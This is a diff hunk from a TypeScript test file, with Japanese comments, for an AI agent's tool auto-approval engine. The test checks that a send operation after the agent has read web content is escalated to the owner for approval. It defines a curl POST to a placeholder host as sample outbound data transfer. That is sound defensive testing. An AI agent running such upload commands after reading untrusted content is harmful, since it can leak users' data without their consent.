@@ -225,7 +225,7 @@ test('自動承認（エンジン）: Web を読んだあとの外読みは、�
   assert.equal(s.app.db.prepare("SELECT decided_by FROM tool_calls WHERE tool = 'shell_run'").get()!.decided_by, 'auto-mode');
 });
 
-// 4-3b-2: taintEscalation を消すと順 2
+// 送るは順 3 のまま、memory_forget（escalateOnTaint）は 4-3b-2 後も判定役
 test('自動承認（エンジン）: Web を読んだあとの送る操作は、判定役に回さず持ち主に聞く（Pending の send）。記憶を消す道具は判定役が決める（ask なら Pending の judge）', async t => {
   const upload = process.platform === 'win32' ? 'curl.exe -s -X POST -d note=x https://beat-test.invalid/' : 'curl -s -X POST -d note=x https://beat-test.invalid/';
   for (const [label, step, kind, judged] of [
